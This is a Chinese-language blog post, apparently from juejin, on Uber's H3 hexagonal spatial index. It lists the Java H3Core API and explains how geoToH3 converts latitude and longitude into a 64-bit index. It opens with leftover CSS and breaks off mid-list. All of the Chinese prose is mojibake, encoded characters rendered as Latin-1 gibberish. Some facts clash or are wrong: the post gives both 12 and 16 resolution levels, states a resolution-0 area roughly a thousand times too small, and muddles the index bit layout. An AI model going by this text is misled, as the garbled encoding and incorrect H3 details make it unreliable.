ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>H3 æ˜¯ä¸€ä¸ª<strong>å…­è¾¹å½¢å±‚æ¬¡ç©ºé—´ç´¢å¼•ç³»ç»Ÿ</strong>ï¼Œå®ƒå°†åœ°çƒè¡¨é¢åˆ’åˆ†ä¸ºä¸€ä¸ªç”±å…­è¾¹å½¢ï¼ˆå’Œå°‘é‡äº”è¾¹å½¢ï¼‰ç»„æˆçš„ç½‘æ ¼ã€‚Java å¼€å‘è€…å¯ä»¥é€šè¿‡å®˜æ–¹æä¾›çš„Â <code>com.uber.h3core</code>Â åº“æ¥ä½¿ç”¨è¿™äº›åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-0">æ ¸å¿ƒæ¦‚å¿µ</h3>
<ul>
<li><strong>å…­è¾¹å½¢ç½‘æ ¼</strong>ï¼šåŸºç¡€å•å…ƒæ˜¯å…­è¾¹å½¢ï¼Œåœ¨12ä¸ªåˆ†è¾¨ç‡ä¸‹å…·æœ‰ä¸åŒçš„é¢ç§¯ã€‚</li>
<li><strong>H3 ç´¢å¼•</strong>ï¼šæ¯ä¸ªå…­è¾¹å½¢ï¼ˆæˆ–äº”è¾¹å½¢ï¼‰éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ 64 ä½Â <code>H3Index</code>Â æ¥è¡¨ç¤ºï¼Œå¯ä»¥ç®€å•åœ°ç”¨ä¸€ä¸ªÂ <code>long</code>Â ç±»å‹æˆ–åå…­è¿›åˆ¶å­—ç¬¦ä¸²æ¥å¤„ç†ã€‚</li>
<li><strong>åˆ†è¾¨ç‡</strong>ï¼šå…±16çº§ï¼ˆ0-15ï¼‰ã€‚åˆ†è¾¨ç‡ 0 çš„å…­è¾¹å½¢æœ€å¤§ï¼ˆå¹³å‡é¢ç§¯çº¦4350 kmÂ²ï¼‰ï¼Œåˆ†è¾¨ç‡ 15 çš„å…­è¾¹å½¢æœ€å°ï¼ˆå¹³å‡é¢ç§¯å°äº1 mÂ²ï¼‰ã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-1">Java å¼€å‘ä¸­ H3 æ”¯æŒçš„æ ¸å¿ƒèƒ½åŠ›</h3>
<p>ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥åœ¨ Java ä»£ç ä¸­ç›´æ¥ä½¿ç”¨çš„ä¸»è¦åŠŸèƒ½ç±»åˆ«ï¼š</p>
<h4 data-id="heading-2">1. åœ°ç†åæ ‡ â†” H3 ç´¢å¼•è½¬æ¢ï¼ˆæ ¸å¿ƒåŠŸèƒ½ï¼‰</h4>
<p>è¿™æ˜¯æœ€åŸºç¡€ä¹Ÿæ˜¯æœ€é‡è¦çš„åŠŸèƒ½ï¼Œç”¨äºåœ¨ç»çº¬åº¦å’Œ H3 ç´¢å¼•ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</p>
<ul>
<li>
<p><strong><code>geoToH3(double lat, double lng, int resolution)</code></strong></p>
<ul>
<li>
<p><strong>åŠŸèƒ½</strong>ï¼šå°†ç»™å®šçš„ç»çº¬åº¦åæ ‡è½¬æ¢ä¸ºæŒ‡å®šåˆ†è¾¨ç‡çš„ H3 ç´¢å¼•ã€‚</p>
</li>
<li>
<p>åˆ†è¾¨ç‡ï¼šæ•´æ•°ï¼ŒæŒ‡å®š H3 ç½‘æ ¼çš„ç²¾åº¦çº§åˆ«ï¼ˆä¾‹å¦‚ 0 åˆ° 15ï¼‰ï¼Œåˆ†è¾¨ç‡è¶Šé«˜ï¼Œç½‘æ ¼å•å…ƒè¶Šå°ï¼Œè¦†ç›–é¢ç§¯è¶Šç²¾ç»†</p>
</li>
<li>
<p><strong>Java ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">H3Core</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> H3Core.newInstance();
<span class="hljs-type">long</span> <span class="hljs-variable">h3Index</span> <span class="hljs-operator">=</span> h3.geoToH3(<span class="hljs-number">40.7128</span>, -<span class="hljs-number">74.0060</span>, <span class="hljs-number">9</span>); <span class="hljs-comment">// çº½çº¦å¸‚åæ ‡ï¼Œåˆ†è¾¨ç‡9</span>
System.out.println(Long.toHexString(h3Index)); <span class="hljs-comment">// è¾“å‡ºï¼š8928308280fffff</span>
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong><code>h3ToGeo(long h3Index)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šå°† H3 ç´¢å¼•è½¬æ¢å›å…¶ä¸­å¿ƒç‚¹çš„ç»çº¬åº¦åæ ‡ã€‚</li>
<li><strong>è¿”å›</strong>ï¼šä¸€ä¸ªÂ <code>List&lt;Double&gt;</code>ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯çº¬åº¦ï¼Œç¬¬äºŒä¸ªæ˜¯ç»åº¦ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>h3ToGeoBoundary(long h3Index)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–ç»™å®š H3 ç´¢å¼•æ‰€ä»£è¡¨çš„å…­è¾¹å½¢çš„è¾¹ç•Œåæ ‡ã€‚</li>
<li><strong>è¿”å›</strong>ï¼šä¸€ä¸ªÂ <code>List&lt;List&lt;Double&gt;&gt;</code>ï¼Œå…¶ä¸­æ¯ä¸ªå†…å±‚ List ä»£è¡¨ä¸€ä¸ªé¡¶ç‚¹çš„Â <code>[lat, lng]</code>ã€‚è¿™å¯¹äºåœ¨åœ°å›¾ä¸Šç»˜åˆ¶å…­è¾¹å½¢è‡³å…³é‡è¦ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3">2. ç½‘æ ¼æ‹“æ‰‘ä¸é‚»åŸŸåˆ†æ</h4>
<p>è¿™ç±»åŠŸèƒ½ç”¨äºåˆ†æå…­è¾¹å½¢ä¹‹é—´çš„ç©ºé—´å…³ç³»ã€‚</p>
<ul>
<li>
<p><strong><code>kRing(long h3Index, int k)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–æŒ‡å®šç´¢å¼•å‘¨å›´Â <code>k</code>Â ç¯ï¼ˆâ€œç¯â€å¯ä»¥ç†è§£ä¸ºè·ç¦»ï¼‰å†…çš„æ‰€æœ‰ H3 ç´¢å¼•ã€‚</li>
<li><strong>ç¤ºä¾‹</strong>ï¼š<code>kRing(index, 1)</code>Â ä¼šè¿”å›ç›®æ ‡å…­è¾¹å½¢æœ¬èº«å’Œä¸å…¶ç›´æ¥ç›¸é‚»çš„6ä¸ªå…­è¾¹å½¢ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>hexRange(long h3Index, int k)</code></strong></p>
<ul>
<li>ç±»ä¼¼Â <code>kRing</code>ï¼Œä½†èƒ½å¤„ç†ç½‘æ ¼å˜å½¢ï¼Œåœ¨è·¨è¶Šå¤§é¢ç§¯æ—¶æ›´å¯é ï¼Œä½†å¯èƒ½å›  pentagon distortionï¼ˆäº”è¾¹å½¢æ‰­æ›²ï¼‰è€Œå¤±è´¥ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>h3Distance(long origin, long target)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè®¡ç®—ä¸¤ä¸ª H3 ç´¢å¼•åœ¨ç½‘æ ¼ç©ºé—´ä¸Šçš„è·ç¦»ï¼ˆä»¥å…­è¾¹å½¢æ•°é‡ä¸ºå•ä½ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>getH3UnidirectionalEdge(long origin, long target)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–ä¸¤ä¸ªç›¸é‚» H3 ç´¢å¼•ä¹‹é—´çš„æœ‰å‘è¾¹ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>getOriginH3IndexFromUnidirectionalEdge(long edge)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šä»æœ‰å‘è¾¹è·å–èµ·å§‹ H3 ç´¢å¼•ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-4">3. ç´¢å¼•å±‚çº§ä¸å…³ç³»</h4>
<p>è¿™ç±»åŠŸèƒ½ç”¨äºåœ¨ä¸åŒåˆ†è¾¨ç‡ä¹‹é—´è¿›è¡Œè½¬æ¢å’Œæ£€æŸ¥ã€‚</p>
<ul>
<li>
<p><strong><code>h3GetResolution(long h3Index)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–ç»™å®š H3 ç´¢å¼•çš„åˆ†è¾¨ç‡ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>h3ToParent(long h3Index, int parentResolution)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–ç»™å®šç´¢å¼•åœ¨æ›´ä½åˆ†è¾¨ç‡ï¼ˆçˆ¶çº§ï¼‰ä¸‹çš„ H3 ç´¢å¼•ã€‚</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šä¸€ä¸ªåˆ†è¾¨ç‡ 9 çš„å…­è¾¹å½¢çš„çˆ¶çº§æ˜¯åˆ†è¾¨ç‡ 8 çš„ä¸€ä¸ªæ›´å¤§çš„å…­è¾¹å½¢ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>h3ToChildren(long h3Index, int childResolution)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–ç»™å®šç´¢å¼•åœ¨æ›´é«˜åˆ†è¾¨ç‡ï¼ˆå­çº§ï¼‰ä¸‹çš„æ‰€æœ‰ H3 ç´¢å¼•ã€‚</li>
<li><strong>ç¤ºä¾‹</strong>ï¼šä¸€ä¸ªåˆ†è¾¨ç‡ 8 çš„å…­è¾¹å½¢é€šå¸¸ä¼šè¢«åˆ’åˆ†ä¸º 7 ä¸ªåˆ†è¾¨ç‡ 9 çš„å­å…­è¾¹å½¢ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-5">4. åŒºåŸŸå¡«å……ä¸çº¿è¦†ç›–</h4>
<p>è¿™æ˜¯éå¸¸å¼ºå¤§çš„ç©ºé—´åˆ†æåŠŸèƒ½ã€‚</p>
<ul>
<li>
<p><strong><code>polyfill(List&lt;List&lt;Double&gt;&gt; polygon, List&lt;List&lt;Double&gt;&gt; holes, int resolution)</code></strong></p>
<ul>
<li>
<p><strong>åŠŸèƒ½</strong>ï¼šç”¨ä¸€ä¸ªå¤šè¾¹å½¢ï¼ˆå¸¦å¯é€‰ç©ºæ´ï¼‰è¦†ç›–åœ°çƒè¡¨é¢ï¼Œå¹¶è¿”å›æ‰€æœ‰è¢«è¯¥å¤šè¾¹å½¢è¦†ç›–çš„ H3 ç´¢å¼•é›†åˆã€‚</p>
</li>
<li>
<p><strong>å‚æ•°</strong>ï¼š</p>
<ul>
<li><code>polygon</code>ï¼šå¤šè¾¹å½¢çš„å¤–è¾¹ç•Œï¼Œæ˜¯ä¸€ä¸ªÂ <code>List</code>Â çš„Â <code>[lat, lng]</code>Â ç‚¹ã€‚</li>
<li><code>holes</code>ï¼šå¤šè¾¹å½¢å†…çš„æ´ï¼Œæ ¼å¼åŒå¤–è¾¹ç•Œã€‚</li>
<li><code>resolution</code>ï¼šç”¨äºå¡«å……çš„ H3 ç½‘æ ¼åˆ†è¾¨ç‡ã€‚</li>
</ul>
</li>
<li>
<p><strong>åº”ç”¨åœºæ™¯</strong>ï¼šè®¡ç®—ä¸€ä¸ªåŸå¸‚è¡Œæ”¿åŒºã€ä¸€ä¸ªæ¹–æ³Šæˆ–ä¸€ä¸ªé…é€åŒºåŸŸå†…åŒ…å«äº†å“ªäº› H3 å…­è¾¹å½¢ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong><code>h3Line(long start, long end)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè®¡ç®—ä¸¤ä¸ª H3 ç´¢å¼•ä¹‹é—´åœ¨ç½‘æ ¼ç©ºé—´ä¸Šçš„æœ€çŸ­è·¯å¾„æ‰€ç»è¿‡çš„ H3 ç´¢å¼•é›†åˆã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-6">5. ç´¢å¼•éªŒè¯ä¸å±æ€§</h4>
<ul>
<li>
<p><strong><code>h3IsValid(long h3Index)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæ£€æŸ¥ä¸€ä¸ª long å€¼æ˜¯å¦æ˜¯æœ‰æ•ˆçš„ H3 ç´¢å¼•ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>h3IsResClassIII(long h3Index)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šæ£€æŸ¥ç´¢å¼•æ˜¯å¦æ˜¯ â€œClass IIIâ€ åˆ†è¾¨ç‡ï¼ˆå¥‡æ•°åˆ†è¾¨ç‡ï¼‰çš„ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>getHexAreaKm2(int resolution)</code>Â /Â <code>getHexAreaM2(int resolution)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–ç‰¹å®šåˆ†è¾¨ç‡çš„å…­è¾¹å½¢çš„å¹³å‡é¢ç§¯ï¼ˆå¹³æ–¹å…¬é‡Œæˆ–å¹³æ–¹ç±³ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong><code>getNumCells(int resolution)</code></strong></p>
<ul>
<li><strong>åŠŸèƒ½</strong>ï¼šè·å–å…¨çƒåœ¨ç‰¹å®šåˆ†è¾¨ç‡ä¸‹çš„å…­è¾¹å½¢æ€»æ•°ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-7">geoToH3æ‰§è¡Œæ•ˆç‡å¦‚ä½•ï¼Œåº•å±‚å¦‚ä½•å®ç°</h2>
<p><code>geoToH3</code>Â çš„æ‰§è¡Œæ•ˆç‡éå¸¸é«˜ï¼Œé€šå¸¸å¯ä»¥è¾¾åˆ°Â <strong>å¾®ç§’çº§</strong>Â ç”šè‡³Â <strong>çº³ç§’çº§</strong>Â çš„å»¶è¿Ÿã€‚</p>
<p>è¿™æ„å‘³ç€åœ¨å•æ ¸CPUä¸Šï¼Œæ¯ç§’å¯ä»¥æ‰§è¡Œæ•°åä¸‡åˆ°ä¸Šç™¾ä¸‡æ¬¡çš„è½¬æ¢æ“ä½œã€‚è¿™å¯¹äºç»å¤§å¤šæ•°éœ€è¦å®æ—¶å¤„ç†æµ·é‡åœ°ç†ä½ç½®æ•°æ®çš„åº”ç”¨åœºæ™¯ï¼ˆå¦‚ç½‘çº¦è½¦æ´¾å•ã€å¤–å–é…é€ã€åœ°ç†å›´æ ã€å®æ—¶æ•°æ®åˆ†æï¼‰æ¥è¯´æ˜¯ç»°ç»°æœ‰ä½™çš„ã€‚</p>
<ul>
<li>
<p><strong>æ€§èƒ½åŸºå‡†</strong>ï¼šæ ¹æ® Uber å®˜æ–¹å’Œéå®˜æ–¹çš„æ€§èƒ½æµ‹è¯•ï¼Œåœ¨ç°ä»£CPUï¼ˆå¦‚ Intel Xeonï¼‰ä¸Šï¼Œå•æ¬¡Â <code>geoToH3</code>Â è°ƒç”¨çš„è€—æ—¶é€šå¸¸åœ¨Â <strong>100 ~ 300 çº³ç§’</strong>Â ä¹‹é—´ã€‚</p>
</li>
<li>
<p><strong>å½±å“å› ç´ </strong>ï¼š</p>
<ul>
<li><strong>åˆ†è¾¨ç‡</strong>ï¼šè½¬æ¢åˆ°ä¸åŒåˆ†è¾¨ç‡å¯¹æ€§èƒ½å½±å“æå°ï¼Œå› ä¸ºæ ¸å¿ƒç®—æ³•æ˜¯ä¸€è‡´çš„ã€‚</li>
<li><strong>CPU æ¶æ„å’Œä¸»é¢‘</strong>ï¼šç›´æ¥å½±å“è®¡ç®—é€Ÿåº¦ã€‚</li>
<li><strong>JVM çŠ¶æ€</strong>ï¼šåœ¨ HotSpot JVM ä¸­ï¼Œæ–¹æ³•ç»è¿‡ JIT ç¼–è¯‘ä¼˜åŒ–åï¼ˆæˆä¸ºæœ¬åœ°ä»£ç ï¼‰æ€§èƒ½ä¼šè¾¾åˆ°æœ€ä½³ã€‚</li>
</ul>
</li>
</ul>
<p>è¿™ç§æé«˜çš„æ€§èƒ½æ˜¯ H3 èƒ½å¤Ÿè¢«å¹¿æ³›åº”ç”¨äºå¤§æ•°æ®å’Œå®æ—¶ç³»ç»Ÿçš„å…³é”®åŸå› ä¹‹ä¸€ã€‚</p>
<hr/>
<h3 data-id="heading-8">åº•å±‚å®ç°åŸç†</h3>
<p><code>geoToH3</code>Â çš„åº•å±‚å®ç°æ˜¯ä¸€ä¸ªéå¸¸ç²¾å¦™çš„å‡ ä½•å­¦å’Œè®¡ç®—æœºå›¾å½¢å­¦ç®—æ³•ã€‚å®ƒçš„ç›®æ ‡æ˜¯å°†ä¸€ä¸ªçƒé¢åæ ‡ï¼ˆç»çº¬åº¦ï¼‰å¿«é€Ÿã€ç¡®å®šæ€§åœ°æ˜ å°„åˆ°ä¸€ä¸ªç‰¹å®šçš„å…­è¾¹å½¢ç½‘æ ¼ç´¢å¼•ä¸Šã€‚</p>
<p>æ•´ä¸ªè¿‡ç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä¸‰ä¸ªæ ¸å¿ƒæ­¥éª¤ï¼š</p>
<ol>
<li><strong>çƒé¢åæ ‡ -&gt; ä¸‰ç»´ç¬›å¡å°”åæ ‡</strong></li>
<li><strong>ä¸‰ç»´åæ ‡ -&gt; é¢ç‰‡ç´¢å¼•ï¼ˆIJK åæ ‡ï¼‰</strong></li>
<li><strong>é¢ç‰‡ç´¢å¼• -&gt; H3 ç´¢å¼•ï¼ˆ64ä½æ•´æ•°ï¼‰</strong></li>
</ol>
<p>è®©æˆ‘ä»¬æ¥è¯¦ç»†æ‹†è§£è¿™ä¸ªè¿‡ç¨‹ï¼š</p>
<h4 data-id="heading-9">æ­¥éª¤ 1ï¼šåæ ‡ç³»ç»Ÿè½¬æ¢å’ŒæŠ•å½±</h4>
<ol>
<li>
<p><strong>è¾“å…¥</strong>ï¼šç»çº¬åº¦Â <code>(lat, lng)</code>ã€‚</p>
</li>
<li>
<p><strong>è½¬æ¢åˆ°ä¸‰ç»´å‘é‡</strong>ï¼šé¦–å…ˆå°†ç»çº¬åº¦è½¬æ¢ä¸ºä¸‰ç»´ç©ºé—´ä¸­çš„ä¸€ä¸ªå•ä½å‘é‡Â <code>(x, y, z)</code>ã€‚è¿™ä¸ªå‘é‡ä½äºä¸€ä¸ªåŠå¾„ä¸º1çš„â€œå•ä½çƒâ€ä¸Šã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç </span>
x = cos(lat) * cos(lng);
y = cos(lat) * sin(lng);
z = sin(lat);
</code></pre>
</li>
<li>
<p><strong>é€‰æ‹©æ­£äºŒåé¢ä½“é¢ç‰‡</strong>ï¼šH3 çš„æ ¸å¿ƒåŸºç¡€æ˜¯ä¸€ä¸ª<strong>å±•å¼€çš„æ­£äºŒåé¢ä½“</strong>ã€‚è¿™ä¸ªå¤šé¢ä½“æœ‰20ä¸ªæ­£ä¸‰è§’å½¢é¢ç‰‡ã€‚ç®—æ³•ä¼šå¿«é€Ÿç¡®å®šè¾“å…¥çš„ä¸‰ç»´å‘é‡æŒ‡å‘äº†è¿™20ä¸ªé¢ç‰‡ä¸­çš„å“ªä¸€ä¸ªã€‚è¿™æ˜¯ä¸€ä¸ªé€šè¿‡å‘é‡ä¸é¢ç‰‡æ³•å‘é‡ç‚¹ç§¯æ¥å®Œæˆçš„å¿«é€ŸæŸ¥æ‰¾è¿‡ç¨‹ã€‚</p>
</li>
</ol>
<h4 data-id="heading-10">æ­¥éª¤ 2ï¼šåœ¨é€‰å®šçš„é¢ç‰‡ä¸Šè¿›è¡Œå…­è¾¹å½¢åŒ–ç½‘æ ¼åˆ’åˆ†</h4>
<p>è¿™æ˜¯æœ€å¤æ‚ä¹Ÿæ˜¯æœ€æ ¸å¿ƒçš„ä¸€æ­¥ã€‚ç®—æ³•éœ€è¦åœ¨é€‰å®šçš„é‚£ä¸ª<strong>ä¸‰è§’å½¢é¢ç‰‡</strong>ä¸Šï¼Œæ„å»ºä¸€ä¸ªç”±å…­è¾¹å½¢å’Œäº”è¾¹å½¢ç»„æˆçš„ç½‘æ ¼ã€‚</p>
<ol>
<li>
<p><strong>å°†ä¸‰è§’å½¢é¢ç‰‡å±•å¼€ä¸ºå¹³é¢</strong>ï¼šé€šè¿‡ä¸€ç§ç‰¹å®šçš„<strong>æ˜ å°„å‡½æ•°</strong>ï¼ˆå¦‚ gnomonic projection æˆ–è‡ªå®šä¹‰çš„ä»¿å°„å˜æ¢ï¼‰ï¼Œå°†ä¸‰ç»´ä¸‰è§’å½¢é¢ç‰‡ä¸Šçš„ç‚¹æŠ•å½±åˆ°ä¸€ä¸ªäºŒç»´å¹³é¢ä¸Šã€‚</p>
</li>
<li>
<p><strong>å®šä¹‰åˆ†è¾¨ç‡å’Œç½‘æ ¼</strong>ï¼šåœ¨æŠ•å½±åçš„äºŒç»´å¹³é¢ä¸Šï¼Œå®šä¹‰ä¸åŒåˆ†è¾¨ç‡ä¸‹çš„å…­è¾¹å½¢ç½‘æ ¼ã€‚æ¯ä¸ªåˆ†è¾¨ç‡éƒ½å¯¹åº”ä¸€ä¸ªæ›´ç»†ç²’åº¦çš„ç½‘æ ¼åˆ’åˆ†ã€‚</p>
</li>
<li>
<p><strong>è®¡ç®— IJ åæ ‡</strong>ï¼šå¯¹äºæŠ•å½±åˆ°äºŒç»´å¹³é¢ä¸Šçš„ç‚¹Â <code>(u, v)</code>ï¼Œç®—æ³•ä¼šè®¡ç®—å®ƒåœ¨å½“å‰åˆ†è¾¨ç‡ç½‘æ ¼ä¸­çš„Â <strong>IJ åæ ‡</strong>ã€‚è¿™å¯ä»¥æƒ³è±¡æˆåœ¨ä¸€ä¸ªç”±è®¸å¤šå°å…­è¾¹å½¢ç»„æˆçš„â€œæ£‹ç›˜â€ä¸Šï¼Œæ‰¾åˆ°ç‚¹Â <code>(u, v)</code>Â è½åœ¨äº†å“ªä¸ªæ ¼å­é‡Œã€‚</p>
<ul>
<li><strong>å…³é”®ç®—æ³•</strong>ï¼šè¿™é‡Œä½¿ç”¨äº†ä¸€ç§åŸºäºÂ  <strong>â€œè½´åæ ‡â€</strong> Â çš„ç½‘æ ¼ç³»ç»Ÿã€‚ç¡®å®šä¸€ä¸ªç‚¹å±äºå“ªä¸ªå…­è¾¹å½¢ï¼Œé€šå¸¸æ˜¯é€šè¿‡è®¡ç®—å®ƒä¸å„ä¸ªå…­è¾¹å½¢ä¸­å¿ƒç‚¹çš„è·ç¦»ï¼Œæˆ–è€…ä½¿ç”¨ä¸€ç§æ›´é«˜æ•ˆçš„ã€åŸºäºå¹³é¢åˆ†å‰²çš„æŸ¥æ‰¾æ–¹æ³•ã€‚</li>
<li><strong>åº“å®ç°</strong>ï¼šåœ¨ H3 çš„ C è¯­è¨€åº•å±‚åº“ä¸­ï¼Œè¿™éƒ¨åˆ†æ˜¯é€šè¿‡é«˜åº¦ä¼˜åŒ–çš„ã€æ— åˆ†æ”¯æˆ–å°‘åˆ†æ”¯çš„æ•´æ•°è¿ç®—å’ŒæŸ¥æ‰¾è¡¨æ¥å®ç°çš„ï¼Œä»¥è¿½æ±‚æè‡´çš„æ€§èƒ½ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-11">æ­¥éª¤ 3ï¼šç¼–ç ä¸º H3Index</h4>
<p>ä¸€æ—¦å¾—åˆ°äº†Â <strong>é¢ç‰‡ç´¢å¼•</strong>Â å’Œè¯¥é¢ç‰‡å†…çš„Â <strong>IJ åæ ‡</strong>Â ä»¥åŠÂ <strong>åˆ†è¾¨ç‡</strong>ï¼Œæœ€åä¸€æ­¥å°±æ˜¯å°†å®ƒä»¬æ‰“åŒ…æˆä¸€ä¸ª 64 ä½çš„Â <code>long</code>Â å‹æ•´æ•°ï¼Œå³Â <code>H3Index</code>ã€‚</p>
<p><code>H3Index</code>Â çš„ 64 ä½ç»“æ„å¦‚ä¸‹ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-text" lang="text">| 0 (1 bit) | Reserved (4 bits) | Mode (4 bits) | Resolution (4 bits) | Base Cell (7 bits) | å­å•å…ƒç´¢å¼• (3 bits * (15 - res)) | 0 (1 bit) |
</code></pre>
<ul>
<li><strong>Mode (4 bits)</strong> ï¼šæ ‡è¯†è¿™ä¸ªç´¢å¼•çš„ç±»å‹ï¼Œä¾‹å¦‚æ˜¯å¦æ˜¯å…­è¾¹å½¢å•å…ƒã€æœ‰å‘è¾¹ç­‰ã€‚å¯¹äºæ™®é€šçš„å…­è¾¹å½¢ï¼Œè¿™ä¸ªå€¼æ˜¯å›ºå®šçš„ã€‚</li>
<li><strong>Resolution (4 bits)</strong> ï¼šå­˜å‚¨åˆ†è¾¨ç‡ï¼ˆ0-15ï¼‰ã€‚</li>
<li><strong>Base Cell (7 bits)</strong> ï¼šå¯¹åº”æ­¥éª¤1ä¸­æ‰¾åˆ°çš„<strong>æ­£äºŒåé¢ä½“é¢ç‰‡</strong>ï¼ˆå®é™…ä¸Šæ˜¯ 122 ä¸ªåŸºç¡€ç»†èƒä¹‹ä¸€ï¼Œè¿™äº›åŸºç¡€ç»†èƒæ¥è‡ªäºå¯¹20ä¸ªé¢ç‰‡çš„è¿›ä¸€æ­¥åˆ’åˆ†ï¼‰ã€‚</li>
<li><strong>å­å•å…ƒç´¢å¼•</strong>ï¼šå‰©ä½™çš„ä½ç”¨äºå­˜å‚¨ä»åŸºç¡€ç»†èƒåˆ°ç›®æ ‡åˆ†è¾¨ç‡ç»†èƒè·¯å¾„ä¸Šçš„æ–¹å‘åºåˆ—ã€‚è¿™å°±åƒæ˜¯ä»ä¸€ä¸ªç²—ç²’åº¦çš„å…­è¾¹å½¢å¼€å§‹ï¼Œé€šè¿‡ä¸€ç³»åˆ—â€œä½ æ˜¯æˆ‘ç¬¬å‡ ä¸ªå­©å­â€çš„æŒ‡å‘ï¼Œæœ€ç»ˆç²¾ç¡®å®šä½åˆ°ç›®æ ‡å…­è¾¹å½¢ã€‚è¿™ç§è¡¨ç¤ºæ–¹æ³•éå¸¸ç´§å‡‘å’Œé«˜æ•ˆã€‚</li>
</ul>
<h3 data-id="heading-12">Java å±‚çš„å®ç°</h3>
<p>åœ¨ Java ä¸­ï¼Œæ‚¨ä½¿ç”¨çš„Â <code>com.uber.h3core.H3Core</code>Â åº“å®é™…ä¸Šæ˜¯ä¸€ä¸ªÂ <strong>JNI (Java Native Interface) åŒ…è£…å™¨</strong>ã€‚</p>
<ul>
<li>
<p><strong>æ ¸å¿ƒé€»è¾‘åœ¨ C è¯­è¨€ä¸­</strong>ï¼šæ‰€æœ‰ä¸Šè¿°å¤æ‚çš„å‡ ä½•è®¡ç®—å’Œç´¢å¼•ç”Ÿæˆç®—æ³•ï¼Œéƒ½æ˜¯ç”¨é«˜åº¦ä¼˜åŒ–çš„ C è¯­è¨€å®ç°çš„ï¼Œå¹¶ç¼–è¯‘ä¸ºæœ¬åœ°åŠ¨æ€åº“ï¼ˆå¦‚Â <code>.so</code>,Â <code>.dll</code>,Â <code>.dylib</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>Java å±‚æ˜¯è–„å°è£…</strong>ï¼š<code>H3Core</code>Â ç±»é€šè¿‡ JNI è°ƒç”¨è¿™äº›åº•å±‚çš„ C å‡½æ•°ã€‚å½“æ‚¨è°ƒç”¨Â <code>h3.geoToH3(lat, lng, res)</code>Â æ—¶ï¼š</p>
<ol>
<li>Java æ–¹æ³•å°†å‚æ•°Â <code>lat</code>,Â <code>lng</code>,Â <code>res</code>Â é€šè¿‡ JNI ä¼ é€’åˆ°æœ¬åœ°ä¾§ã€‚</li>
<li>æœ¬åœ°ä¾§çš„ C å‡½æ•°æ‰§è¡Œä¸Šè¿°ä¸‰ä¸ªæ ¸å¿ƒæ­¥éª¤ã€‚</li>
<li>è®¡ç®—ç»“æœï¼ˆä¸€ä¸ªÂ <code>uint64_t</code>ï¼‰é€šè¿‡ JNI è¿”å›ç»™ Java å±‚ï¼Œä½œä¸ºÂ <code>long</code>Â ç±»å‹ã€‚</li>
</ol>
</li>
</ul>
<p><strong>è¿™ç§æ¶æ„çš„ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
